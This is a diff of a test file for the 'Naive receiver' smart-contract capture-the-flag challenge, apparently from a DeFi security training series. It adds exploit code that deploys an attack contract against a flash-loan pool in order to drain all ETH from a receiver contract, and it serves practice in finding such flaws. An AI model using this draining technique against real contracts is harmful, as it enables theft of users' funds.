@@ -31,11 +31,15 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        // borrow from the flash loan pool, but to the reciever address
+        // need to do this from a contract
+        const attackContractFactory = await ethers.getContractFactory("AttackNaiveReciever");
+        const attackContract = await attackContractFactory.deploy(this.pool.address, this.receiver.address);
+        await attackContract.connect(attacker).attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
         // All ETH has been drained from the receiver
         expect(
             await ethers.provider.getBalance(this.receiver.address)
